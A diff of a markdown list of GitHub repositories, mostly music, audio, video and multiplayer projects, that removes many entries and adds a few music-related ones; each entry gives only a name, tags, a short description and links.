+- 🐙 **Source Code:** [https://github.com/lieff/minih264](https://github.com/lieff/minih264)
+- 👤 **Developer:** [lieff](https://github.com/lieff)
 
 
 ---
 
-### 📦 Ignitetechnologies/Privilege-Escalation
+### 📦 kennethreitz/pytheory
 
-> **Categories:** `#cheatsheet` `#ctf` `#ctf_challenges` `#ctf_writeups` `#hack` `#hacking` `#oscp` `#oscp_journey` `#oscp_prep` `#privilege_escalation` `#vulnhub`
+> **Categories:** `#music` `#music_theory` `#python` `#scales` `#sympy`
 
-This cheasheet is aimed at the CTF Players and Beginners to help them understand the fundamentals of Privilege Escalation with examples.
-
-- 🐙 **Source Code:** [https://github.com/Ignitetechnologies/Privilege-Escalation](https://github.com/Ignitetechnologies/Privilege-Escalation)
-- 👤 **Developer:** [Ignitetechnologies](https://github.com/Ignitetechnologies)
-
-
----
-
-### 📦 nining377/UnblockMusicPro_Xposed
-
-> **Categories:** `#android` `#neteasecloudmusic` `#unblock` `#xposed`
-
-Unblock Netease Cloud Music with Xposed
-**Language**: Java
-
-- 🐙 **Source Code:** [https://github.com/nining377/UnblockMusicPro_Xposed](https://github.com/nining377/UnblockMusicPro_Xposed)
-- 👤 **Developer:** [nining377](https://github.com/nining377)
-
-
----
-
-### 📦 ExistentialAudio/BlackHole
-
-> **Categories:** `#audio` `#driver` `#macos`
-
-BlackHole is a modern macOS virtual audio driver that allows applications to pass audio to other applications with zero latency.
-**Language**: C
-
-- 🐙 **Source Code:** [https://github.com/ExistentialAudio/BlackHole](https://github.com/ExistentialAudio/BlackHole)
-- 👤 **Developer:** [ExistentialAudio](https://github.com/ExistentialAudio)
-
-
----
-
-### 📦 fornclake/TetraForce
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-GBC Zelda-inspired game with online multiplayer. Built with Godot Engine
-**Language**: GDScript
-**Stars**: 113 **Issues**: 8 **Forks**: 22
-https://github.com/fornclake/TetraForce
-
-- 🐙 **Source Code:** [https://github.com/fornclake/TetraForce](https://github.com/fornclake/TetraForce)
-- 👤 **Developer:** [fornclake](https://github.com/fornclake)
-
-
----
-
-### 📦 cawfree/react-native-quiet
-
-> **Categories:** `#audio` `#chirp` `#data` `#quiet` `#quietjs` `#react` `#react_native` `#send` `#transmit` `#ultrasonic`
-
-🤫 Quiet for React Native.
-**Language**: JavaScript
-
-- 🐙 **Source Code:** [https://github.com/cawfree/react-native-quiet](https://github.com/cawfree/react-native-quiet)
-- 👤 **Developer:** [cawfree](https://github.com/cawfree)
-
-
----
-
-### 📦 paulirish/lite-youtube-embed
-
-> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Web` `#Video`
-
-A faster youtube embed.
-**Language**: HTML
-**Stars**: 119 **Issues**: 1 **Forks**: 3
-https://github.com/paulirish/lite-youtube-embed
-
-- 🐙 **Source Code:** [https://github.com/paulirish/lite-youtube-embed](https://github.com/paulirish/lite-youtube-embed)
-- 👤 **Developer:** [paulirish](https://github.com/paulirish)
-
-
----
-
-### 📦 ZahraHeydari/MusicPlayer
-
-> **Categories:** `#android_app` `#android_clean_architecture_kotlin` `#android_clean_architecture_sample` `#android_cleanarchitecture` `#broadcast_reciever` `#dependency_injection` `#exoplayer` `#exoplayer2` `#koin` `#livedata` `#livedata_viewmodel` `#music_player` `#mvvm` `#mvvm_android` `#mvvm_architecture` `#notification_android` `#notification_service` `#notifications` `#room_database` `#service`
-
-Implemented using Clean Arch, MVVM, LiveData, Room, Koin, Coil, Service, Notification and ExoPlayer
-**Language**: Kotlin
-
-- 🐙 **Source Code:** [https://github.com/ZahraHeydari/MusicPlayer](https://github.com/ZahraHeydari/MusicPlayer)
-- 👤 **Developer:** [ZahraHeydari](https://github.com/ZahraHeydari)
-
-
----
-
-### 📦 pakastin/car
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Multiplayer 2d car physics with JavaScript!
-**Language**: JavaScript
-**Stars**: 242 **Issues**: 6 **Forks**: 16
-https://github.com/pakastin/car
-
-- 🐙 **Source Code:** [https://github.com/pakastin/car](https://github.com/pakastin/car)
-- 👤 **Developer:** [pakastin](https://github.com/pakastin)
-
-
----
-
-### 📦 calebj0seph/spectro
-
-> **Categories:** `#app` `#application` `#audio` `#audio_visualizer` `#dsp` `#fft` `#javascript` `#material_design` `#material_ui` `#microphone` `#react` `#sound` `#spectrogram` `#typescript` `#web` `#webgl` `#webgl_experiments`
-
-🎶 Real-time audio spectrogram generator for the web
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/calebj0seph/spectro](https://github.com/calebj0seph/spectro)
-- 👤 **Developer:** [calebj0seph](https://github.com/calebj0seph)
-
-
----
-
-### 📦 openai/jukebox
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Code for "Jukebox: A Generative Model for Music"
+Music Theory for Humans.
 **Language**: Python
-**Stars**: 446 **Issues**: 5 **Forks**: 23
-[https://github.com/openai/jukebox](https://github.com/openai/jukebox)
 
-- 🐙 **Source Code:** [https://github.com/openai/jukebox](https://github.com/openai/jukebox)
-- 👤 **Developer:** [openai](https://github.com/openai)
+- 🐙 **Source Code:** [https://github.com/kennethreitz/pytheory](https://github.com/kennethreitz/pytheory)
+- 👤 **Developer:** [kennethreitz](https://github.com/kennethreitz)
 
 
 ---
 
-### 📦 irshadshalu/music-grid
+### 📦 SmallRuralDog/electron-vue-music
 
-> **Categories:** `#GitHub` `#OpenSource`
+> **Categories:** `#electron` `#electron_vue` `#music` `#music_player`
 
-A Music Grid you can play around and create short music.
-**Language**: HTML
-**Stars**: 165 **Issues**: 7 **Forks**: 12
-[https://github.com/irshadshalu/music-grid](https://github.com/irshadshalu/music-grid)
+A music player developed based on electron-vue, the interface imitates QQ Music, and the technology stack is electron-vue+vue+vuex+vue-router+element- UI. Continuously updated, welcome to star
+**Language**: Vue
 
-- 🐙 **Source Code:** [https://github.com/irshadshalu/music-grid](https://github.com/irshadshalu/music-grid)
-- 👤 **Developer:** [irshadshalu](https://github.com/irshadshalu)
+- 🐙 **Source Code:** [https://github.com/SmallRuralDog/electron-vue-music](https://github.com/SmallRuralDog/electron-vue-music)
+- 👤 **Developer:** [SmallRuralDog](https://github.com/SmallRuralDog)
 
 
 ---
 
-### 📦 denverquane/amongusdiscord
+### 📦 steve228uk/YouTube-Music
 
-> **Categories:** `#among_us` `#automute` `#discord_bot`
+> **Categories:** `#mac` `#macos` `#music` `#osx` `#swift` `#wrapper` `#youtube`
 
-Discord Bot to scrape Among Us on-screen data and automatically mute players between rounds
-**Language**: Go
-
-- 🐙 **Source Code:** [https://github.com/denverquane/amongusdiscord](https://github.com/denverquane/amongusdiscord)
-- 👤 **Developer:** [denverquane](https://github.com/denverquane)
-
-
----
-
-### 📦 iampawan/AI-Radio
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-This is a radio app where you can ask Alan AI to play some music.
-**Language**: C++
-**Stars**: 123 **Issues**: 0 **Forks**: 21
-[https://github.com/iampawan/AI-Radio](https://github.com/iampawan/AI-Radio)
-
-- 🐙 **Source Code:** [https://github.com/iampawan/AI-Radio](https://github.com/iampawan/AI-Radio)
-- 👤 **Developer:** [iampawan](https://github.com/iampawan)
-
-
----
-
-### 📦 victor369basu/Real-time-stock-market-prediction
-
-> **Categories:** `#deep_learning` `#kafka` `#machine_learning` `#mongodb` `#nodejs` `#streaming` `#tensorflow` `#tensorflowjs` `#tensorflowjs_models`
-
-In this repository, I have developed the entire server-side principal architecture for real-time stock market prediction with Machine Learning. I have used Tensorflow.js for constructing ml model architecture, and Kafka for real-time data streaming and pipelining.
-**Language**: JavaScript
-
-- 🐙 **Source Code:** [https://github.com/victor369basu/Real-time-stock-market-prediction](https://github.com/victor369basu/Real-time-stock-market-prediction)
-- 👤 **Developer:** [victor369basu](https://github.com/victor369basu)
-
-
----
-
-### 📦 zju3dv/EasyMocap
-
-> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Video`
-
-Make human motion capture easier.
-**Language**: Python
-**Stars**: 117 **Issues**: 0 **Forks**: 11
-[https://github.com/zju3dv/EasyMocap](https://github.com/zju3dv/EasyMocap)
-
-- 🐙 **Source Code:** [https://github.com/zju3dv/EasyMocap](https://github.com/zju3dv/EasyMocap)
-- 👤 **Developer:** [zju3dv](https://github.com/zju3dv)
-
-
----
-
-### 📦 jpsim/ZenTuner
-
-> **Categories:** `#ios` `#macos` `#music` `#swift` `#swiftui` `#tuner`
-
-A minimal chromatic tuner.
+:musical_note: A Mac app wrapper for music.youtube.com
 **Language**: Swift
 
-- 🐙 **Source Code:** [https://github.com/jpsim/ZenTuner](https://github.com/jpsim/ZenTuner)
-- 👤 **Developer:** [jpsim](https://github.com/jpsim)
-
-
----
-
-### 📦 BMSVieira/moovie.js
-
-> **Categories:** `#html5` `#player` `#player_controls` `#player_video` `#vanilla_javascript` `#vanillajs`
-
-Movie focused HTML5 Player
-**Language**: JavaScript
-
-- 🐙 **Source Code:** [https://github.com/BMSVieira/moovie.js](https://github.com/BMSVieira/moovie.js)
-- 👤 **Developer:** [BMSVieira](https://github.com/BMSVieira)
-
-
----
-
-### 📦 LingDong-****/legumes
-
-> **Categories:** `#renderer` `#vector_graphics` `#sheet_music` `#hershey_fonts` `#polylines`
-
-🎼 A sheet music to polylines renderer
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/LingDong-/legumes](https://github.com/LingDong-/legumes)
-- 👤 **Developer:** [LingDong-](https://github.com/LingDong-)
-
-
----
-
-### 📦 benthecoder/yt-channels-DS-AI-ML-CS
-
-> **Categories:** `#python` `#learning` `#lists` `#data_science` `#data` `#machine_learning` `#youtube` `#awesome` `#statistics` `#ai` `#deep_learning` `#math` `#ml` `#resources` `#artificial_intelligence` `#data_analysis` `#awesome_list` `#dataengineering`
-
-A comprehensive list of YouTube Channels for Data Science,  Data Engineering, Machine Learning, Deep learning, Computer Science, programming, software engineering, etc.
-
-- 🐙 **Source Code:** [https://github.com/benthecoder/yt-channels-DS-AI-ML-CS](https://github.com/benthecoder/yt-channels-DS-AI-ML-CS)
-- 👤 **Developer:** [benthecoder](https://github.com/benthecoder)
-
-
----
-
-### 📦 SartoxOnlyGNU/audacium
-
-> **Categories:** `#audio` `#editor` `#audacity` `#audacium`
-
-Audacity fork without Telemetry and with new features
-**Language**: C
-
-- 🐙 **Source Code:** [https://github.com/SartoxOnlyGNU/audacium](https://github.com/SartoxOnlyGNU/audacium)
-- 👤 **Developer:** [SartoxOnlyGNU](https://github.com/SartoxOnlyGNU)
-
-
----
-
-### 📦 TangStudio/PathView
-
-> **Categories:** `#android` `#kotlin` `#training` `#playground` `#animation` `#stopwatch` `#sport` `#wearable_devices` `#pathview`
-
-Simulate the running route of each player on the playground, and can be timed with a stopwatch
-**Language**: Kotlin
-
-- 🐙 **Source Code:** [https://github.com/TangStudio/PathView](https://github.com/TangStudio/PathView)
-- 👤 **Developer:** [TangStudio](https://github.com/TangStudio)
-
-
----
-
-### 📦 ekzhang/****composing.studio
-
-> **Categories:** `#abc_notation` `#collaborative_editing` `#music` `#music_composition` `#react` `#rust` `#typescript`
-
-Collaborative music composition for everyone.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/ekzhang/composing.studio](https://github.com/ekzhang/composing.studio)
-- 👤 **Developer:** [ekzhang](https://github.com/ekzhang)
-
-
----
-
-### 📦 DusteDdk/dstream
-
-> **Categories:** `#GitHub` `#OpenSource` `#Server` `#HTML`
-
-bespoke music player for web
-**Language**: JavaScript
-**Stars**: 178 **Issues**: 1 **Forks**: 9
-[https://github.com/DusteDdk/dstream](https://github.com/DusteDdk/dstream)
-
-- 🐙 **Source Code:** [https://github.com/DusteDdk/dstream](https://github.com/DusteDdk/dstream)
-- 👤 **Developer:** [DusteDdk](https://github.com/DusteDdk)
-
-
----
-
-### 📦 Anarios/return-youtube-dislike
-
-> **Categories:** `#GitHub` `#OpenSource` `#JavaScript` `#Youtube` `#Extension`
-
-Chrome extension to return youtube dislikes
-**Language**: JavaScript
-**Stars**: 143 **Issues**: 0 **Forks**: 7
-[https://github.com/Anarios/return-youtube-dislike](https://github.com/Anarios/return-youtube-dislike)
-
-- 🐙 **Source Code:** [https://github.com/Anarios/return-youtube-dislike](https://github.com/Anarios/return-youtube-dislike)
-- 👤 **Developer:** [Anarios](https://github.com/Anarios)
-
-
----
-
-### 📦 pgamerx/yt-dislikes-viewer
-
-> **Categories:** `#chrome` `#chrome_extension` `#chrome_extensions` `#chromium` `#chromium_extension` `#dislikes` `#dislikes_count` `#likes_dislikes` `#mozilla` `#mozilla_firefox` `#mozilla_firefox_addon` `#youtube` `#youtube_api` `#youtube_api_v3` `#youtube_extension`
-
-A browser extension that allows you to see dislikes on a youtube video after the youtube update
-**Language**: JavaScript
-
-- 🐙 **Source Code:** [https://github.com/pgamerx/yt-dislikes-viewer](https://github.com/pgamerx/yt-dislikes-viewer)
-- 👤 **Developer:** [pgamerx](https://github.com/pgamerx)
-
-
----
-
-### 📦 glibg10b/ltt-linux-challenge-issues
-
-> **Categories:** `#linustechtips` `#linux` `#user_experience` `#youtube`
-
-A list of issues Linus and Luke experienced during the LTT Linux Daily Driver Challenge
-
-- 🐙 **Source Code:** [https://github.com/glibg10b/ltt-linux-challenge-issues](https://github.com/glibg10b/ltt-linux-challenge-issues)
-- 👤 **Developer:** [glibg10b](https://github.com/glibg10b)
-
-
----
-
-### 📦 WorldQL/worldql_server
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-The spatial message broker and database for real-time multiplayer experiences. Official Rust implementation.
-**Language**: Rust
-**Stars**: 104 **Issues**: 1 **Forks**: 9
-[https://github.com/WorldQL/worldql_server](https://github.com/WorldQL/worldql_server)
-
-- 🐙 **Source Code:** [https://github.com/WorldQL/worldql_server](https://github.com/WorldQL/worldql_server)
-- 👤 **Developer:** [WorldQL](https://github.com/WorldQL)
-
-
----
-
-### 📦 Yetangitu/Spodcast
-
-> **Categories:** `#podcast_fetcher` `#rss_generator` `#spotify_api`
-
-Spodcast is a caching Spotify podcast to RSS proxy. Using Spodcast you can follow Spotify-hosted netcasts/podcasts using any player which supports RSS, thus enabling the use of older hardware which is not compatible with the Spotify (web) app.
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/Yetangitu/Spodcast](https://github.com/Yetangitu/Spodcast)
-- 👤 **Developer:** [Yetangitu](https://github.com/Yetangitu)
-
-
----
-
-### 📦 TheRealOrange/terminalvideoplayer
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-**Language**: C++
-**Stars**: 179 **Issues**: 4 **Forks**: 2
-[https://github.com/TheRealOrange/terminalvideoplayer](https://github.com/TheRealOrange/terminalvideoplayer)
-
-- 🐙 **Source Code:** [https://github.com/TheRealOrange/terminalvideoplayer](https://github.com/TheRealOrange/terminalvideoplayer)
-- 👤 **Developer:** [TheRealOrange](https://github.com/TheRealOrange)
-
-
----
-
-### 📦 krystalgamer/stem-player-emulator
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Kanye West's stem player emulator
-**Language**: JavaScript
-**Stars**: 167 **Issues**: 0 **Forks**: 25
-[https://github.com/krystalgamer/stem-player-emulator](https://github.com/krystalgamer/stem-player-emulator)
-
-- 🐙 **Source Code:** [https://github.com/krystalgamer/stem-player-emulator](https://github.com/krystalgamer/stem-player-emulator)
-- 👤 **Developer:** [krystalgamer](https://github.com/krystalgamer)
-
-
----
-
-### 📦 blackle/blamscamp
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-create a bandcamp-style audio player for selling albums on itch.io
-**Language**: HTML
-**Stars**: 121 **Issues**: 0 **Forks**: 8
-[https://github.com/blackle/blamscamp](https://github.com/blackle/blamscamp)
-
-- 🐙 **Source Code:** [https://github.com/blackle/blamscamp](https://github.com/blackle/blamscamp)
-- 👤 **Developer:** [blackle](https://github.com/blackle)
-
-
----
-
-### 📦 GetStream/stream-draw-android
-
-> **Categories:** `#android` `#architecture` `#coroutines` `#drawing` `#hilt` `#jetpack_compose` `#kotlin` `#network` `#okhttp` `#real_time` `#retrofit` `#stream_chat` `#stream_draw`
-
-🛥 Stream Draw is a real-time multiplayer drawing & chat game app built entirely with Jetpack Compose.
-**Language**: Kotlin
-
-- 🐙 **Source Code:** [https://github.com/GetStream/stream-draw-android](https://github.com/GetStream/stream-draw-android)
-- 👤 **Developer:** [GetStream](https://github.com/GetStream)
-
-
----
-
-### 📦 openmultiplayer/server-beta
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-open.mp server beta releases
-**Stars**: 70 **Issues**: 13 **Forks**: 4
-[https://github.com/openmultiplayer/server-beta](https://github.com/openmultiplayer/server-beta)
-
-- 🐙 **Source Code:** [https://github.com/openmultiplayer/server-beta](https://github.com/openmultiplayer/server-beta)
-- 👤 **Developer:** [openmultiplayer](https://github.com/openmultiplayer)
-
-
----
-
-### 📦 vfsfitvnm/ViMusic
-
-> **Categories:** `#android` `#jetpack_compose` `#music_player` `#youtube` `#kotlin` `#music`
-
-A Jetpack Compose Android application for streaming music from YouTube Music.
-**Language**: Kotlin
-
-- 🐙 **Source Code:** [https://github.com/vfsfitvnm/ViMusic](https://github.com/vfsfitvnm/ViMusic)
-- 👤 **Developer:** [vfsfitvnm](https://github.com/vfsfitvnm)
-
-
----
-
-### 📦 sensity-ai/dot
-
-> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Video` `#Deepfake`
-
-The Deepfake Offensive Toolkit
-**Language**: Python
-**Stars**: 1302 **Issues**: 5 **Forks**: 81
-[https://github.com/sensity-ai/dot](https://github.com/sensity-ai/dot)
-
-- 🐙 **Source Code:** [https://github.com/sensity-ai/dot](https://github.com/sensity-ai/dot)
-- 👤 **Developer:** [sensity-ai](https://github.com/sensity-ai)
-
-
----
-
-### 📦 IonelPopJara/ascii-video-player
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-A simple script that turns .mp4 files into ASCII characters
-**Language**: C++
-**Stars**: 210 **Issues**: 2 **Forks**: 28
-[https://github.com/IonelPopJara/ascii-video-player](https://github.com/IonelPopJara/ascii-video-player)
-
-- 🐙 **Source Code:** [https://github.com/IonelPopJara/ascii-video-player](https://github.com/IonelPopJara/ascii-video-player)
-- 👤 **Developer:** [IonelPopJara](https://github.com/IonelPopJara)
-
-
----
-
-### 📦 csteinmetz1/ai-audio-startups
-
-> **Categories:** `#audio` `#list` `#startups`
-
-Community list of startups working with AI in audio and music technology
-
-- 🐙 **Source Code:** [https://github.com/csteinmetz1/ai-audio-startups](https://github.com/csteinmetz1/ai-audio-startups)
-- 👤 **Developer:** [csteinmetz1](https://github.com/csteinmetz1)
-
-
----
-
-### 📦 ZaneH/piano-trainer
-
-> **Categories:** `#audio` `#chords` `#circle_of_fifths` `#keyboard` `#midi` `#midir` `#music` `#music_learning` `#music_theory` `#piano` `#piano_lessons` `#quiz` `#react` `#react_piano` `#rust` `#scales` `#tauri` `#trainer`
-
-🎹 Memorize piano scales with ease! A music practice program w/ MIDI support. Consider it an interactive reference manual
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/ZaneH/piano-trainer](https://github.com/ZaneH/piano-trainer)
-- 👤 **Developer:** [ZaneH](https://github.com/ZaneH)
-
-
----
-
-### 📦 unkperson/player-model-changer
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-💉: gamesense lua script to change local player model
-**Language**: Lua
-**Stars**: 100 **Issues**: 0 **Forks**: 0
-[https://github.com/unkperson/player-model-changer](https://github.com/unkperson/player-model-changer)
-
-- 🐙 **Source Code:** [https://github.com/unkperson/player-model-changer](https://github.com/unkperson/player-model-changer)
-- 👤 **Developer:** [unkperson](https://github.com/unkperson)
-
-
----
-
-### 📦 MubertAI/Mubert-Text-to-Music
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-A simple notebook demonstrating prompt-based music generation via Mubert API
-**Language**: Jupyter Notebook
-**Stars**: 208 **Issues**: 3 **Forks**: 16
-[https://github.com/MubertAI/Mubert-Text-to-Music](https://github.com/MubertAI/Mubert-Text-to-Music)
-
-- 🐙 **Source Code:** [https://github.com/MubertAI/Mubert-Text-to-Music](https://github.com/MubertAI/Mubert-Text-to-Music)
-- 👤 **Developer:** [MubertAI](https://github.com/MubertAI)
-
-
----
-
-### 📦 trevorjay/Jerrica
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Jerrica is a small, bare bones, 100% scheduled, web audio native, MOD player designed to be embedded in Javascript games
-**Language**: JavaScript
-**Stars**: 137 **Issues**: 1 **Forks**: 2
-[https://github.com/trevorjay/Jerrica](https://github.com/trevorjay/Jerrica)
-
-- 🐙 **Source Code:** [https://github.com/trevorjay/Jerrica](https://github.com/trevorjay/Jerrica)
-- 👤 **Developer:** [trevorjay](https://github.com/trevorjay)
-
-
----
-
-### 📦 ilaria-manco/multimodal-ml-music
-
-> **Categories:** `#academic_publications` `#awesome_list` `#multimodal_data` `#multimodal_deep_learning` `#multimodal_learning` `#music_ai` `#music_information_retrieval` `#music_research` `#resources`
-
-List of academic resources on Multimodal ML for Music
-**Language**: TeX
-
-- 🐙 **Source Code:** [https://github.com/ilaria-manco/multimodal-ml-music](https://github.com/ilaria-manco/multimodal-ml-music)
-- 👤 **Developer:** [ilaria-manco](https://github.com/ilaria-manco)
-
-
----
-
-### 📦 davidfowl/TriviaR
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-A multiplayer trivia game using SignalR and .NET 7
-**Language**: C#
-**Stars**: 108 **Issues**: 0 **Forks**: 4
-[https://github.com/davidfowl/TriviaR](https://github.com/davidfowl/TriviaR)
-
-- 🐙 **Source Code:** [https://github.com/davidfowl/TriviaR](https://github.com/davidfowl/TriviaR)
-- 👤 **Developer:** [davidfowl](https://github.com/davidfowl)
-
-
----
-
-### 📦 jafarlihi/sysm
-
-> **Categories:** `#audio` `#linux` `#music` `#system_monitor` `#system_monitoring` `#Interesting` `#Useful` `#System`
-
-sysm makes your system play custom sounds when any configured system or external event happens
-**Language**: C++
-
-- 🐙 **Source Code:** [https://github.com/jafarlihi/sysm](https://github.com/jafarlihi/sysm)
-- 👤 **Developer:** [jafarlihi](https://github.com/jafarlihi)
-
-
----
-
-### 📦 samim23/polymath
-
-> **Categories:** `#audio` `#machine_learning` `#ml` `#music` `#python`
-
-Convert any music library into a music production sample-library with ML
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/samim23/polymath](https://github.com/samim23/polymath)
-- 👤 **Developer:** [samim23](https://github.com/samim23)
-
-
----
-
-### 📦 VideoCrafter/VideoCrafter
-
-> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Video`
-
-A Toolkit for Text-to-Video Generation and Editing
-**Language**: Python
-**Stars**: 410 **Issues**: 3 **Forks**: 19
-[https://github.com/VideoCrafter/VideoCrafter](https://github.com/VideoCrafter/VideoCrafter)
-
-- 🐙 **Source Code:** [https://github.com/VideoCrafter/VideoCrafter](https://github.com/VideoCrafter/VideoCrafter)
-- 👤 **Developer:** [VideoCrafter](https://github.com/VideoCrafter)
-
-
----
-
-### 📦 OpenGVLab/Ask-Anything
-
-> **Categories:** `#captioning_videos` `#chat` `#chatgpt` `#gradio` `#langchain` `#moss` `#stablelm` `#video` `#video_question_answering` `#video_understanding`
-
-a simple yet interesting tool for chatting about video with chatGPT, miniGPT4 and StableLM
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/OpenGVLab/Ask-Anything](https://github.com/OpenGVLab/Ask-Anything)
-- 👤 **Developer:** [OpenGVLab](https://github.com/OpenGVLab)
-
-
----
-
-### 📦 StanGirard/quiver
-
-> **Categories:** `#audio` `#chat` `#chatgpt` `#csv` `#embeddings` `#generativeai` `#obsidian` `#pdf` `#second_brain` `#vectorstore` `#whisper`
-
-Dump all your files and thoughts into your GenerativeAI brain and chat with it
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/StanGirard/quiver](https://github.com/StanGirard/quiver)
-- 👤 **Developer:** [StanGirard](https://github.com/StanGirard)
-
-
----
-
-### 📦 facebookresearch/audiocraft
-
-> **Categories:** `#GitHub` `#OpenSource` `#Audio` `#craft` `#audiocraft`
-
-Audiocraft is a library for audio processing and generation with deep learning. It features the state-of-the-art EnCodec audio compressor / tokenizer, along with MusicGen, a simple and controllable music generation LM with textual and melodic conditioning.
-**Language**: Python
-**Stars**: 938 **Issues**: 15 **Forks**: 55
-[https://github.com/facebookresearch/audiocraft](https://github.com/facebookresearch/audiocraft)
-
-- 🐙 **Source Code:** [https://github.com/facebookresearch/audiocraft](https://github.com/facebookresearch/audiocraft)
-- 👤 **Developer:** [facebookresearch](https://github.com/facebookresearch)
-
-
----
-
-### 📦 steven-tey/chathn
-
-> **Categories:** `#ai` `#ai_sdk` `#edge_functions` `#hacker_news` `#nextjs` `#openai` `#openai_functions` `#streaming` `#vercel`
-
-Chat with Hacker News using natural language. Built with OpenAI Functions and Vercel AI SDK.
-**Language**: TypeScript
-
-- 🐙 **Source Code:** [https://github.com/steven-tey/chathn](https://github.com/steven-tey/chathn)
-- 👤 **Developer:** [steven-tey](https://github.com/steven-tey)
-
-
----
-
-### 📦 dredozubov/polyrhythmix
-
-> **Categories:** `#drums` `#drums_generation` `#midi` `#music` `#polyrhythm` `#polyrhythms` `#rust`
-
-Polyrhythmically-inclinded Midi Drum generator
-**Language**: Rust
-
-- 🐙 **Source Code:** [https://github.com/dredozubov/polyrhythmix](https://github.com/dredozubov/polyrhythmix)
-- 👤 **Developer:** [dredozubov](https://github.com/dredozubov)
-
-
----
-
-### 📦 dttung2905/kafka-in-production
-
-> **Categories:** `#distributed_systems` `#kafka` `#streaming`
-
-:books: Tech blogs & talks by companies that run Kafka in production
-
-- 🐙 **Source Code:** [https://github.com/dttung2905/kafka-in-production](https://github.com/dttung2905/kafka-in-production)
-- 👤 **Developer:** [dttung2905](https://github.com/dttung2905)
-
-
----
-
-### 📦 haoheliu/AudioLDM2
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Text-to-Audio/Music Generation
-**Language**: Python
-**Stars**: 499 **Issues**: 9 **Forks**: 34
-[https://github.com/haoheliu/AudioLDM2](https://github.com/haoheliu/AudioLDM2)
-
-- 🐙 **Source Code:** [https://github.com/haoheliu/AudioLDM2](https://github.com/haoheliu/AudioLDM2)
-- 👤 **Developer:** [haoheliu](https://github.com/haoheliu)
-
-
----
-
-### 📦 StreamViewBot/StreamViewerBot
-
-> **Categories:** `#bigolive` `#dlive` `#facebook_live` `#kick` `#stream` `#streambot` `#streamviewerbot` `#trovo` `#twitch` `#viewer` `#viewer_bot` `#viewerbot` `#youtube`
-
-Twitch , YouTube , Kick , Facebook Live , DLive , Nimo Tv , Trovo Live - Gain Viewer Effortlessly with our easy to use Stream Viewer Bot.
-
-- 🐙 **Source Code:** [https://github.com/StreamViewBot/StreamViewerBot](https://github.com/StreamViewBot/StreamViewerBot)
-- 👤 **Developer:** [StreamViewBot](https://github.com/StreamViewBot)
-
-
----
-
-### 📦 VASTDynamics/Vaporizer2
-
-> **Categories:** `#aax` `#audio` `#audiounit_plugins` `#cpp` `#daw` `#music` `#plugin` `#sampler` `#synthesizer` `#vst` `#vst3` `#vst3_plugin` `#wavetable`
-
-Vaporizer2 hybrid wavetable additive / subtractive VST / AU / AAX synthesizer / sampler workstation plugin
-**Language**: C++
-
-- 🐙 **Source Code:** [https://github.com/VASTDynamics/Vaporizer2](https://github.com/VASTDynamics/Vaporizer2)
-- 👤 **Developer:** [VASTDynamics](https://github.com/VASTDynamics)
-
-
----
-
-### 📦 developerrahulofficial/jennie-anime-player
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-**Language**: TypeScript
-**Stars**: 166 **Issues**: 6 **Forks**: 52
-[https://github.com/developerrahulofficial/jennie-anime-player](https://github.com/developerrahulofficial/jennie-anime-player)
-
-- 🐙 **Source Code:** [https://github.com/developerrahulofficial/jennie-anime-player](https://github.com/developerrahulofficial/jennie-anime-player)
-- 👤 **Developer:** [developerrahulofficial](https://github.com/developerrahulofficial)
-
-
----
-
-### 📦 huggingface/distil-whisper
-
-> **Categories:** `#audio` `#speech_recognition` `#whisper`
-
-- 🐙 **Source Code:** [https://github.com/huggingface/distil-whisper](https://github.com/huggingface/distil-whisper)
-- 👤 **Developer:** [huggingface](https://github.com/huggingface)
-
-
----
-
-### 📦 TuneNN/TuneNN
-
-> **Categories:** `#audio` `#machine_learning` `#music` `#pitch_detection` `#pitch_estimation`
-
-A transformer-based network model for pitch detection
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/TuneNN/TuneNN](https://github.com/TuneNN/TuneNN)
-- 👤 **Developer:** [TuneNN](https://github.com/TuneNN)
-
-
----
-
-### 📦 xNul/palworld-host-save-fix
-
-> **Categories:** `#bugfix` `#co_op` `#dedicated_server` `#multiplayer` `#palworld` `#palworld_dedicated_server` `#steam`
-
-Fixes the bug which forces a player to create a new character when they already have a save. Useful for migrating maps from co-op to dedicated servers and from one dedicated server to another.
-**Language**: Python
-
-- 🐙 **Source Code:** [https://github.com/xNul/palworld-host-save-fix](https://github.com/xNul/palworld-host-save-fix)
-- 👤 **Developer:** [xNul](https://github.com/xNul)
-
-
----
-
-### 📦 DoMusic/Hybrid-Net
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Real-time audio source separation, generate lyrics, chords, beat.
-**Language**: Python
-**Stars**: 506 **Issues**: 0 **Forks**: 19
-[https://github.com/DoMusic/Hybrid-Net](https://github.com/DoMusic/Hybrid-Net)
-
-- 🐙 **Source Code:** [https://github.com/DoMusic/Hybrid-Net](https://github.com/DoMusic/Hybrid-Net)
-- 👤 **Developer:** [DoMusic](https://github.com/DoMusic)
-
-
----
-
-### 📦 glanceapp/glance
-
